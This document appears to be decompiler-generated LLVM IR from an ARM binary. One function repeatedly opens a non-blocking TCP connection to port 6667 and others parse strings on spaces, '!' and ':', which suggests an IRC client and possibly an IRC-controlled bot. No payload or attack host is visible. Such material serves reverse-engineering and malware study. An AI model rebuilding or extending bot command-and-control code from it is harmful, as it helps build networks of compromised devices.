define i32 @function_b9fc(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_b9fc:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-44 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  store i32 47624, i32* %stack_var_-4, align 4
  %v2_ba04 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ba04, i32* @fp, align 4
  br label %dec_label_pc_ba4c.preheader

dec_label_pc_ba34:                                ; preds = %dec_label_pc_ba64
  %v1_ba38 = add i32 %.pre, 1
  %v5_ba3c = inttoptr i32 %v1_ba38 to i8*
  %v1_ba44 = add i32 %stack_var_-40.0, 1
  br label %dec_label_pc_ba4c

dec_label_pc_ba4c:                                ; preds = %dec_label_pc_ba4c.preheader, %dec_label_pc_ba34
  %stack_var_-32.0 = phi i8* [ %v5_ba3c, %dec_label_pc_ba34 ], [ %stack_var_-32.118, %dec_label_pc_ba4c.preheader ]
  %stack_var_-40.0 = phi i32 [ %v1_ba44, %dec_label_pc_ba34 ], [ %stack_var_-40.119, %dec_label_pc_ba4c.preheader ]
  store i32 %tmp, i32* @r0, align 4
  %v0_ba54 = call i32 @function_f670()
  %v3_ba5c = icmp ult i32 %stack_var_-40.0, %v0_ba54
  %.pre = ptrtoint i8* %stack_var_-32.0 to i32
  br i1 %v3_ba5c, label %dec_label_pc_ba64, label %dec_label_pc_ba74

dec_label_pc_ba64:                                ; preds = %dec_label_pc_ba4c
  %v2_ba68 = load i8, i8* %stack_var_-32.0, align 1
  %v7_ba6c = icmp eq i8 %v2_ba68, 32
  br i1 %v7_ba6c, label %dec_label_pc_ba74, label %dec_label_pc_ba34

dec_label_pc_ba74:                                ; preds = %dec_label_pc_ba4c, %dec_label_pc_ba64
  %v1_ba78 = add i32 %.pre, 1
  store i32 %tmp, i32* @r0, align 4
  %v0_ba88 = call i32 @function_f670()
  %v9_ba90 = icmp eq i32 %stack_var_-40.0, %v0_ba88
  br i1 %v9_ba90, label %dec_label_pc_bd14, label %dec_label_pc_ba98

dec_label_pc_ba98:                                ; preds = %dec_label_pc_ba74
  %v5_ba7c = inttoptr i32 %v1_ba78 to i8*
  %v1_ba9c = add nuw nsw i32 %storemerge820, 1
  %v7_baac = icmp slt i32 %v1_ba9c, 5
  br i1 %v7_baac, label %dec_label_pc_ba4c.preheader, label %dec_label_pc_bac8

dec_label_pc_ba4c.preheader:                      ; preds = %dec_label_pc_b9fc, %dec_label_pc_ba98
  %storemerge820 = phi i32 [ 0, %dec_label_pc_b9fc ], [ %v1_ba9c, %dec_label_pc_ba98 ]
  %stack_var_-40.119 = phi i32 [ 0, %dec_label_pc_b9fc ], [ %stack_var_-40.0, %dec_label_pc_ba98 ]
  %stack_var_-32.118 = phi i8* [ %arg3, %dec_label_pc_b9fc ], [ %v5_ba7c, %dec_label_pc_ba98 ]
  br label %dec_label_pc_ba4c

dec_label_pc_babc:                                ; preds = %dec_label_pc_bae0
  %v1_bac0 = add i32 %storemerge9, 1
  br label %dec_label_pc_bac8

dec_label_pc_bac8:                                ; preds = %dec_label_pc_ba98, %dec_label_pc_babc
  %storemerge9 = phi i32 [ %v1_bac0, %dec_label_pc_babc ], [ 0, %dec_label_pc_ba98 ]
  store i32 %storemerge9, i32* @r4, align 4
  store i32 %v1_ba78, i32* @r0, align 4
  %v0_bad0 = call i32 @function_f670()
  %v0_bad8 = load i32, i32* @r4, align 4
  %v3_bad8 = icmp ult i32 %v0_bad8, %v0_bad0
  br i1 %v3_bad8, label %dec_label_pc_bae0, label %dec_label_pc_bac8.dec_label_pc_bafc_crit_edge

dec_label_pc_bac8.dec_label_pc_bafc_crit_edge:    ; preds = %dec_label_pc_bac8
  %.pre26 = add i32 %storemerge9, %v1_ba78
  %.pre27 = inttoptr i32 %.pre26 to i8*
  br label %dec_label_pc_bafc

dec_label_pc_bae0:                                ; preds = %dec_label_pc_bac8
  %v2_baec = add i32 %storemerge9, %v1_ba78
  %v1_baf0 = inttoptr i32 %v2_baec to i8*
  %v2_baf0 = load i8, i8* %v1_baf0, align 1
  %v7_baf4 = icmp eq i8 %v2_baf0, 32
  br i1 %v7_baf4, label %dec_label_pc_bafc, label %dec_label_pc_babc

dec_label_pc_bafc:                                ; preds = %dec_label_pc_bae0, %dec_label_pc_bac8.dec_label_pc_bafc_crit_edge
  %v3_bb10.pre-phi = phi i8* [ %.pre27, %dec_label_pc_bac8.dec_label_pc_bafc_crit_edge ], [ %v1_baf0, %dec_label_pc_bae0 ]
  store i8 0, i8* %v3_bb10.pre-phi, align 1
  %v2_bb18 = load i32, i32* @global_var_2599c.175, align 4
  %v4_bb24 = call i32 @function_fa14(i8* %v5_ba7c, i32 %v2_bb18)
  %v2_bb2c = icmp eq i32 %v4_bb24, 0
  br i1 %v2_bb2c, label %dec_label_pc_bb34, label %dec_label_pc_bd14

dec_label_pc_bb34:                                ; preds = %dec_label_pc_bafc
  %v2_bb38 = load i32, i32* @global_var_23244.20, align 4
  %v2_bb3c = icmp eq i32 %v2_bb38, 0
  br i1 %v2_bb3c, label %dec_label_pc_bb44, label %dec_label_pc_bd14

dec_label_pc_bb44:                                ; preds = %dec_label_pc_bb34
  br label %dec_label_pc_bb78.preheader

dec_label_pc_bb60:                                ; preds = %dec_label_pc_bb90
  %v1_bb64 = add i32 %.pre28, 1
  %v5_bb68 = inttoptr i32 %v1_bb64 to i8*
  %v1_bb70 = add i32 %stack_var_-40.2, 1
  br label %dec_label_pc_bb78

dec_label_pc_bb78:                                ; preds = %dec_label_pc_bb78.preheader, %dec_label_pc_bb60
  %stack_var_-32.2 = phi i8* [ %v5_bb68, %dec_label_pc_bb60 ], [ %stack_var_-32.315, %dec_label_pc_bb78.preheader ]
  %stack_var_-40.2 = phi i32 [ %v1_bb70, %dec_label_pc_bb60 ], [ %stack_var_-40.316, %dec_label_pc_bb78.preheader ]
  store i32 %tmp, i32* @r0, align 4
  %v0_bb80 = call i32 @function_f670()
  %v3_bb88 = icmp ult i32 %stack_var_-40.2, %v0_bb80
  %.pre28 = ptrtoint i8* %stack_var_-32.2 to i32
  br i1 %v3_bb88, label %dec_label_pc_bb90, label %dec_label_pc_bba0

dec_label_pc_bb90:                                ; preds = %dec_label_pc_bb78
  %v2_bb94 = load i8, i8* %stack_var_-32.2, align 1
  %v7_bb98 = icmp eq i8 %v2_bb94, 32
  br i1 %v7_bb98, label %dec_label_pc_bba0, label %dec_label_pc_bb60

dec_label_pc_bba0:                                ; preds = %dec_label_pc_bb78, %dec_label_pc_bb90
  %v1_bba4 = add i32 %.pre28, 1
  store i32 %tmp, i32* @r0, align 4
  %v0_bbb4 = call i32 @function_f670()
  %v9_bbbc = icmp eq i32 %stack_var_-40.2, %v0_bbb4
  br i1 %v9_bbbc, label %dec_label_pc_bd14, label %dec_label_pc_bbc4

dec_label_pc_bbc4:                                ; preds = %dec_label_pc_bba0
  %v5_bba8 = inttoptr i32 %v1_bba4 to i8*
  %v1_bbc8 = add nuw nsw i32 %storemerge1017, 1
  %v7_bbd8 = icmp slt i32 %v1_bbc8, 3
  br i1 %v7_bbd8, label %dec_label_pc_bb78.preheader, label %dec_label_pc_bbf4

dec_label_pc_bb78.preheader:                      ; preds = %dec_label_pc_bb44, %dec_label_pc_bbc4
  %storemerge1017 = phi i32 [ 0, %dec_label_pc_bb44 ], [ %v1_bbc8, %dec_label_pc_bbc4 ]
  %stack_var_-40.316 = phi i32 [ 0, %dec_label_pc_bb44 ], [ %stack_var_-40.2, %dec_label_pc_bbc4 ]
  %stack_var_-32.315 = phi i8* [ %arg3, %dec_label_pc_bb44 ], [ %v5_bba8, %dec_label_pc_bbc4 ]
  br label %dec_label_pc_bb78

dec_label_pc_bbe8:                                ; preds = %dec_label_pc_bc0c
  %v1_bbec = add i32 %storemerge11, 1
  br label %dec_label_pc_bbf4

dec_label_pc_bbf4:                                ; preds = %dec_label_pc_bbc4, %dec_label_pc_bbe8
  %storemerge11 = phi i32 [ %v1_bbec, %dec_label_pc_bbe8 ], [ 0, %dec_label_pc_bbc4 ]
  store i32 %storemerge11, i32* @r4, align 4
  store i32 %v1_bba4, i32* @r0, align 4
  %v0_bbfc = call i32 @function_f670()
  %v0_bc04 = load i32, i32* @r4, align 4
  %v3_bc04 = icmp ult i32 %v0_bc04, %v0_bbfc
  br i1 %v3_bc04, label %dec_label_pc_bc0c, label %dec_label_pc_bbf4.dec_label_pc_bc28_crit_edge

dec_label_pc_bbf4.dec_label_pc_bc28_crit_edge:    ; preds = %dec_label_pc_bbf4
  %.pre29 = add i32 %storemerge11, %v1_bba4
  %.pre30 = inttoptr i32 %.pre29 to i8*
  br label %dec_label_pc_bc28

dec_label_pc_bc0c:                                ; preds = %dec_label_pc_bbf4
  %v2_bc18 = add i32 %storemerge11, %v1_bba4
  %v1_bc1c = inttoptr i32 %v2_bc18 to i8*
  %v2_bc1c = load i8, i8* %v1_bc1c, align 1
  %v7_bc20 = icmp eq i8 %v2_bc1c, 32
  br i1 %v7_bc20, label %dec_label_pc_bc28, label %dec_label_pc_bbe8

dec_label_pc_bc28:                                ; preds = %dec_label_pc_bc0c, %dec_label_pc_bbf4.dec_label_pc_bc28_crit_edge
  %v3_bc3c.pre-phi = phi i8* [ %.pre30, %dec_label_pc_bbf4.dec_label_pc_bc28_crit_edge ], [ %v1_bc1c, %dec_label_pc_bc0c ]
  store i8 0, i8* %v3_bc3c.pre-phi, align 1
  store i32 %v1_bba4, i32* @r0, align 4
  %v2_bc44 = call i32 @function_fe00(i32 %v1_bba4)
  %v5_bc4c = trunc i32 %v2_bc44 to i8
  store i8 %v5_bc4c, i8* %stack_var_-44, align 1
  %v3_bc54 = icmp eq i8 %v5_bc4c, -1
  br i1 %v3_bc54, label %dec_label_pc_bc5c, label %dec_label_pc_bcb8

dec_label_pc_bc5c:                                ; preds = %dec_label_pc_bc28
  store i32 %v1_bba4, i32* @r0, align 4
  %v2_bc60 = call i32 @function_fe28(i32 %v1_bba4)
  %v2_bc70 = icmp eq i32 %v2_bc60, 0
  br i1 %v2_bc70, label %dec_label_pc_bc78, label %dec_label_pc_bc94

dec_label_pc_bc78:                                ; preds = %dec_label_pc_bc5c
  %v2_bc7c = load i32, i32* @global_var_25ab0.173, align 4
  store i32 %v2_bc7c, i32* @r2, align 4
  %v3_bc8c = call i32 @function_8398(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_19688.208 to i32))
  br label %dec_label_pc_bd14

dec_label_pc_bc94:                                ; preds = %dec_label_pc_bc5c
  %v1_bc98 = add i32 %v2_bc60, 16
  %v2_bc98 = inttoptr i32 %v1_bc98 to i32*
  %v3_bc98 = load i32, i32* %v2_bc98, align 4
  %v1_bc9c = inttoptr i32 %v3_bc98 to i32*
  %v2_bc9c = load i32, i32* %v1_bc9c, align 4
  store i32 %v2_bc9c, i32* @r1, align 4
  %v1_bca4 = add i32 %v2_bc60, 12
  %v2_bca4 = inttoptr i32 %v1_bca4 to i32*
  %v3_bca4 = load i32, i32* %v2_bca4, align 4
  store i32 %v3_bca4, i32* @r2, align 4
  %v2_bcac = ptrtoint i8* %stack_var_-44 to i32
  store i32 %v2_bcac, i32* @r3, align 4
  store i32 %v2_bcac, i32* @r0, align 4
  %v0_bcb4 = call i32 @function_f700()
  %v2_bcc4.pre = load i8, i8* %stack_var_-44, align 1
  br label %dec_label_pc_bcb8

dec_label_pc_bcb8:                                ; preds = %dec_label_pc_bc28, %dec_label_pc_bc94
  %v1_bd1c25 = phi i32 [ %v0_bcb4, %dec_label_pc_bc94 ], [ %v2_bc44, %dec_label_pc_bc28 ]
  %v2_bcc4 = phi i8 [ %v2_bcc4.pre, %dec_label_pc_bc94 ], [ %v5_bc4c, %dec_label_pc_bc28 ]
  store i8 %v2_bcc4, i8* bitcast (i8** @global_var_23243.210 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_23240.18 to i8*), align 4
  store i32 256, i32* @global_var_23244.20, align 4
  br label %dec_label_pc_bd14

dec_label_pc_bd14:                                ; preds = %dec_label_pc_ba74, %dec_label_pc_bba0, %dec_label_pc_bb34, %dec_label_pc_bafc, %dec_label_pc_bc78, %dec_label_pc_bcb8
  %v1_bd1c = phi i32 [ 0, %dec_label_pc_bb34 ], [ %v4_bb24, %dec_label_pc_bafc ], [ %v3_bc8c, %dec_label_pc_bc78 ], [ %v1_bd1c25, %dec_label_pc_bcb8 ], [ %v0_bbb4, %dec_label_pc_bba0 ], [ %v0_ba88, %dec_label_pc_ba74 ]
  ret i32 %v1_bd1c

; uselistorder directives
  uselistorder i32 %storemerge11, { 1, 0, 3, 2 }
  uselistorder i32 %v1_bbc8, { 1, 0 }
  uselistorder i32 %v1_bba4, { 3, 2, 5, 4, 0, 1, 6, 7 }
  uselistorder i32 %stack_var_-40.2, { 2, 0, 1, 3 }
  uselistorder i8* %stack_var_-32.2, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0, 3, 2 }
  uselistorder i32 %v1_ba9c, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 2, 0, 1, 3 }
  uselistorder i8* %stack_var_-32.0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** @global_var_23240.18, { 0, 1, 4, 3, 2 }
  uselistorder i32* @global_var_23244.20, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i8* %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bd14, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_bcb8, { 1, 0 }
  uselistorder label %dec_label_pc_bbf4, { 1, 0 }
  uselistorder label %dec_label_pc_bb78.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_bba0, { 1, 0 }
  uselistorder label %dec_label_pc_bac8, { 1, 0 }
  uselistorder label %dec_label_pc_ba4c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_ba74, { 1, 0 }
}

define i32 @function_bd34(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_bd34:
  %stack_var_-4 = alloca i32, align 4
  store i32 48448, i32* %stack_var_-4, align 4
  %v2_bd3c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_bd3c, i32* @fp, align 4
  %v2_bd54 = load i32, i32* @global_var_2599c.175, align 4
  store i32 %v2_bd54, i32* @r0, align 4
  %v0_bd5c = call i32 @function_11048()
  %v0_bd60 = call i32 @function_86b4()
  store i32 %v0_bd60, i32* @global_var_2599c.175, align 4
  ret i32 %v0_bd60

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_bd80(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_bd80:
  %tmp = ptrtoint i8* %arg3 to i32
  %stack_var_-4 = alloca i32, align 4
  store i32 48524, i32* %stack_var_-4, align 4
  %v2_bd88 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_bd88, i32* @fp, align 4
  br label %dec_label_pc_bdb4

dec_label_pc_bda8:                                ; preds = %dec_label_pc_bdcc
  %v1_bdac = add i32 %storemerge2, 1
  br label %dec_label_pc_bdb4

dec_label_pc_bdb4:                                ; preds = %dec_label_pc_bd80, %dec_label_pc_bda8
  %storemerge2 = phi i32 [ 0, %dec_label_pc_bd80 ], [ %v1_bdac, %dec_label_pc_bda8 ]
  store i32 %storemerge2, i32* @r4, align 4
  store i32 %arg2, i32* @r0, align 4
  %v0_bdbc = call i32 @function_f670()
  %v0_bdc4 = load i32, i32* @r4, align 4
  %v3_bdc4 = icmp ult i32 %v0_bdc4, %v0_bdbc
  br i1 %v3_bdc4, label %dec_label_pc_bdcc, label %dec_label_pc_bdb4.dec_label_pc_bde8_crit_edge

dec_label_pc_bdb4.dec_label_pc_bde8_crit_edge:    ; preds = %dec_label_pc_bdb4
  %.pre = add i32 %storemerge2, %arg2
  %.pre4 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_bde8

dec_label_pc_bdcc:                                ; preds = %dec_label_pc_bdb4
  %v2_bdd8 = add i32 %storemerge2, %arg2
  %v1_bddc = inttoptr i32 %v2_bdd8 to i8*
  %v2_bddc = load i8, i8* %v1_bddc, align 1
  %v7_bde0 = icmp eq i8 %v2_bddc, 33
  br i1 %v7_bde0, label %dec_label_pc_bde8, label %dec_label_pc_bda8

dec_label_pc_bde8:                                ; preds = %dec_label_pc_bdcc, %dec_label_pc_bdb4.dec_label_pc_bde8_crit_edge
  %v3_bdfc.pre-phi = phi i8* [ %.pre4, %dec_label_pc_bdb4.dec_label_pc_bde8_crit_edge ], [ %v1_bddc, %dec_label_pc_bdcc ]
  store i8 0, i8* %v3_bdfc.pre-phi, align 1
  %v2_be04 = load i32, i32* @global_var_2599c.175, align 4
  %v2_be10 = inttoptr i32 %arg2 to i8*
  %v3_be10 = call i32 @function_fa14(i8* %v2_be10, i32 %v2_be04)
  %v2_be18 = icmp eq i32 %v3_be10, 0
  br i1 %v2_be18, label %dec_label_pc_be20, label %dec_label_pc_be74

dec_label_pc_be20:                                ; preds = %dec_label_pc_bde8
  %v2_be24 = load i8, i8* %arg3, align 1
  %v7_be28 = icmp eq i8 %v2_be24, 58
  br i1 %v7_be28, label %dec_label_pc_be30, label %dec_label_pc_be3c

dec_label_pc_be30:                                ; preds = %dec_label_pc_be20
  %v1_be34 = add i32 %tmp, 1
  %v5_be38 = inttoptr i32 %v1_be34 to i8*
  br label %dec_label_pc_be3c

dec_label_pc_be3c:                                ; preds = %dec_label_pc_be20, %dec_label_pc_be30
  %stack_var_-44.0 = phi i8* [ %v5_be38, %dec_label_pc_be30 ], [ %arg3, %dec_label_pc_be20 ]
  %v2_be40 = load i32, i32* @global_var_2599c.175, align 4
  %v2_be44 = icmp eq i32 %v2_be40, 0
  br i1 %v2_be44, label %dec_label_pc_be5c, label %dec_label_pc_be4c

dec_label_pc_be4c:                                ; preds = %dec_label_pc_be3c
  store i32 %v2_be40, i32* @r0, align 4
  %v0_be58 = call i32 @function_11048()
  br label %dec_label_pc_be5c

dec_label_pc_be5c:                                ; preds = %dec_label_pc_be3c, %dec_label_pc_be4c
  %v4_be5c = ptrtoint i8* %stack_var_-44.0 to i32
  %v2_be60 = call i32 @function_fb80(i32 %v4_be5c)
  store i32 %v2_be60, i32* @global_var_2599c.175, align 4
  br label %dec_label_pc_be74

dec_label_pc_be74:                                ; preds = %dec_label_pc_bde8, %dec_label_pc_be5c
  %v1_be7c = phi i32 [ %v3_be10, %dec_label_pc_bde8 ], [ %v2_be60, %dec_label_pc_be5c ]
  ret i32 %v1_be7c

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_be74, { 1, 0 }
  uselistorder label %dec_label_pc_be5c, { 1, 0 }
  uselistorder label %dec_label_pc_be3c, { 1, 0 }
  uselistorder label %dec_label_pc_bdb4, { 1, 0 }
}

define i32 @function_be84() local_unnamed_addr {
dec_label_pc_be84:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_be88 = load i32, i32* @fp, align 4
  store i32 48784, i32* %stack_var_-4, align 4
  %v2_be8c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_be8c, i32* @fp, align 4
  %v2_bfbc = ptrtoint i32* %stack_var_-40 to i32
  %v2_c00c = ptrtoint i32* %stack_var_-48 to i32
  %v2_c04c = ptrtoint i32* %stack_var_-44 to i32
  br label %dec_label_pc_be94

dec_label_pc_be94:                                ; preds = %dec_label_pc_be94.backedge, %dec_label_pc_be84
  store i32 -1, i32* @global_var_259a0.10, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v2_beac = load i32, i32* @global_var_23238.132, align 4
  %v2_beb0 = icmp eq i32 %v2_beac, 0
  br i1 %v2_beb0, label %dec_label_pc_beb8, label %dec_label_pc_beec

dec_label_pc_beb8:                                ; preds = %dec_label_pc_be94
  %v0_beb8 = call i32 @function_113ec()
  %v2_bec4 = load i32, i32* inttoptr (i32 143092 to i32*), align 4
  %v2_bed0 = call i32 @function_cd70(i32 %v0_beb8, i32 %v2_bec4)
  %v4_bee0 = mul i32 %v2_bec4, 4
  %v5_bee0 = add i32 %v4_bee0, 143096
  %v6_bee0 = inttoptr i32 %v5_bee0 to i32*
  %v7_bee0 = load i32, i32* %v6_bee0, align 4
  store i32 %v7_bee0, i32* @global_var_25aa8.130, align 4
  br label %dec_label_pc_beec

dec_label_pc_beec:                                ; preds = %dec_label_pc_be94, %dec_label_pc_beb8
  store i32 0, i32* @global_var_23238.132, align 4
  br label %dec_label_pc_bef8

dec_label_pc_bef8:                                ; preds = %dec_label_pc_bef8, %dec_label_pc_beec
  %v3_bf04 = call i32 @function_10044(i32 2, i32 1, i32 6)
  store i32 %v3_bf04, i32* @global_var_259a0.10, align 4
  %v1_bf1c = icmp slt i32 %v3_bf04, 0
  br i1 %v1_bf1c, label %dec_label_pc_bef8, label %dec_label_pc_bf24

dec_label_pc_bf24:                                ; preds = %dec_label_pc_bef8
  %v2_bf28 = load i32, i32* @global_var_25aa8.130, align 4
  store i32 %v2_bf28, i32* @r0, align 4
  %v1_bf30 = call i32 @function_fe00(i32 %v2_bf28)
  %v2_bf38 = icmp eq i32 %v1_bf30, 0
  br i1 %v2_bf38, label %dec_label_pc_bf5c, label %dec_label_pc_bf40

dec_label_pc_bf40:                                ; preds = %dec_label_pc_bf24
  %v2_bf44 = load i32, i32* @global_var_25aa8.130, align 4
  store i32 %v2_bf44, i32* @r0, align 4
  %v1_bf4c = call i32 @function_fe00(i32 %v2_bf44)
  %v3_bf54 = icmp eq i32 %v1_bf4c, -1
  br i1 %v3_bf54, label %dec_label_pc_bf5c, label %dec_label_pc_bfd0

dec_label_pc_bf5c:                                ; preds = %dec_label_pc_bf40, %dec_label_pc_bf24
  %v2_bf60 = load i32, i32* @global_var_25aa8.130, align 4
  store i32 %v2_bf60, i32* @r0, align 4
  %v1_bf68 = call i32 @function_fe28(i32 %v2_bf60)
  %v2_bf78 = icmp eq i32 %v1_bf68, 0
  br i1 %v2_bf78, label %dec_label_pc_bf80, label %dec_label_pc_bfa0

dec_label_pc_bf80:                                ; preds = %dec_label_pc_bf5c
  store i32 0, i32* @global_var_25aa8.130, align 4
  %v2_bf90 = load i32, i32* @global_var_259a0.10, align 4
  %v1_bf98 = call i32 @function_d088(i32 %v2_bf90)
  br label %dec_label_pc_be94.backedge

dec_label_pc_be94.backedge:                       ; preds = %dec_label_pc_bf80, %dec_label_pc_c140
  br label %dec_label_pc_be94

dec_label_pc_bfa0:                                ; preds = %dec_label_pc_bf5c
  %v1_bfa4 = add i32 %v1_bf68, 16
  %v2_bfa4 = inttoptr i32 %v1_bfa4 to i32*
  %v3_bfa4 = load i32, i32* %v2_bfa4, align 4
  %v1_bfa8 = inttoptr i32 %v3_bfa4 to i32*
  %v2_bfa8 = load i32, i32* %v1_bfa8, align 4
  %v1_bfb0 = add i32 %v1_bf68, 12
  %v2_bfb0 = inttoptr i32 %v1_bfb0 to i32*
  %v3_bfb0 = load i32, i32* %v2_bfb0, align 4
  store i32 %v3_bfb0, i32* @r2, align 4
  store i32 %v2_bfbc, i32* @r3, align 4
  %v3_bfc8 = call i32 @function_f6d0(i32 %v2_bfa8, i32 %v2_bfbc, i32 %v3_bfb0)
  br label %dec_label_pc_bfe8

dec_label_pc_bfd0:                                ; preds = %dec_label_pc_bf40
  %v2_bfd4 = load i32, i32* @global_var_25aa8.130, align 4
  store i32 %v2_bfd4, i32* @r0, align 4
  %v1_bfdc = call i32 @function_fe00(i32 %v2_bfd4)
  store i32 %v1_bfdc, i32* %stack_var_-40, align 4
  br label %dec_label_pc_bfe8

dec_label_pc_bfe8:                                ; preds = %dec_label_pc_bfa0, %dec_label_pc_bfd0
  store i32 2, i32* %stack_var_-44, align 4
  %v1_bff8 = call i32 @function_fc54(i32 6667)
  %v2_c008 = load i32, i32* @global_var_259a0.10, align 4
  store i32 %v2_c008, i32* @r3, align 4
  %v3_c01c = call i32 @function_d034(i32 %v2_c008, i32 21537, i32 %v2_c00c)
  %v2_c024 = call i32 @function_ced8(i32* null)
  br label %dec_label_pc_c120

dec_label_pc_c034:                                ; preds = %dec_label_pc_c120
  %v0_c034 = call i32 @function_d0ec()
  %v2_c040 = inttoptr i32 %v0_c034 to i32*
  store i32 0, i32* %v2_c040, align 4
  %v2_c048 = load i32, i32* @global_var_259a0.10, align 4
  %v3_c05c = call i32 @function_ff1c(i32 %v2_c048, i32 %v2_c04c, i32 16)
  %v2_c064 = icmp eq i32 %v3_c05c, 0
  br i1 %v2_c064, label %dec_label_pc_c080, label %dec_label_pc_c06c

dec_label_pc_c06c:                                ; preds = %dec_label_pc_c034
  %v0_c06c = call i32 @function_d0ec()
  %v1_c074 = inttoptr i32 %v0_c06c to i32*
  %v2_c074 = load i32, i32* %v1_c074, align 4
  %v7_c078 = icmp eq i32 %v2_c074, 106
  br i1 %v7_c078, label %dec_label_pc_c080, label %dec_label_pc_c0f0

dec_label_pc_c080:                                ; preds = %dec_label_pc_c06c, %dec_label_pc_c034
  %v2_c084 = load i32, i32* @global_var_259a0.10, align 4
  %v5_c0a0 = call i32 @function_10000(i32 %v2_c084, i32 1, i32 13, i32 0, i32 0)
  %v2_c0a8 = load i32, i32* @global_var_259a0.10, align 4
  %v5_c0c4 = call i32 @function_10000(i32 %v2_c0a8, i32 1, i32 2, i32 0, i32 0)
  %v2_c0cc = load i32, i32* @global_var_259a0.10, align 4
  %v5_c0e8 = call i32 @function_10000(i32 %v2_c0cc, i32 1, i32 9, i32 0, i32 0)
  store i32 %v3_be88, i32* @fp, align 4
  ret i32 %v5_c0e8

dec_label_pc_c0f0:                                ; preds = %dec_label_pc_c06c
  %v0_c0f0 = call i32 @function_d0ec()
  %v1_c0f8 = inttoptr i32 %v0_c0f0 to i32*
  %v2_c0f8 = load i32, i32* %v1_c0f8, align 4
  %v7_c0fc = icmp eq i32 %v2_c0f8, 115
  br i1 %v7_c0fc, label %dec_label_pc_c118, label %dec_label_pc_c104

dec_label_pc_c104:                                ; preds = %dec_label_pc_c0f0
  %v0_c104 = call i32 @function_d0ec()
  %v1_c10c = inttoptr i32 %v0_c104 to i32*
  %v2_c10c = load i32, i32* %v1_c10c, align 4
  %v7_c110 = icmp eq i32 %v2_c10c, 114
  br i1 %v7_c110, label %dec_label_pc_c118, label %dec_label_pc_c140

dec_label_pc_c118:                                ; preds = %dec_label_pc_c104, %dec_label_pc_c0f0
  %v1_c11c = call i32 @function_11ca8(i32 1)
  br label %dec_label_pc_c120

dec_label_pc_c120:                                ; preds = %dec_label_pc_bfe8, %dec_label_pc_c118
  %v2_c124 = call i32 @function_ced8(i32* null)
  %v2_c134 = sub i32 %v2_c124, %v2_c024
  %tmp = icmp ult i32 %v2_c134, 10
  br i1 %tmp, label %dec_label_pc_c034, label %dec_label_pc_c140

dec_label_pc_c140:                                ; preds = %dec_label_pc_c104, %dec_label_pc_c120
  store i32 0, i32* @global_var_25aa8.130, align 4
  %v2_c150 = load i32, i32* @global_var_259a0.10, align 4
  %v1_c158 = call i32 @function_d088(i32 %v2_c150)
  br label %dec_label_pc_be94.backedge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @function_11ca8, { 17, 0, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_10000, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_fc54, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_f6d0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_fe28, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_fe00, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @function_113ec, { 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_23238.132, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c140, { 1, 0 }
  uselistorder label %dec_label_pc_c120, { 1, 0 }
  uselistorder label %dec_label_pc_bfe8, { 1, 0 }
  uselistorder label %dec_label_pc_be94.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_beec, { 1, 0 }
}

define i32 @function_c174(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c174:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-2648 = alloca i32, align 4
  %stack_var_-6744 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-1624 = alloca i32, align 4
  %stack_var_-600 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_c174 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c174, label %bb, label %.thread22

bb:                                               ; preds = %dec_label_pc_c174
  %v1_c174 = load i32, i32* %r2.global-to-local, align 4
  %v4_c174 = inttoptr i32 %v1_c174 to i32*
  store i32 %v1_c174, i32* %v4_c174, align 4
  %v5_c174 = load i32, i32* @r4, align 4
  %v6_c174 = load i32, i32* %r2.global-to-local, align 4
  %v7_c174 = sub i32 %v6_c174, %v5_c174
  store i32 %v7_c174, i32* %r2.global-to-local, align 4
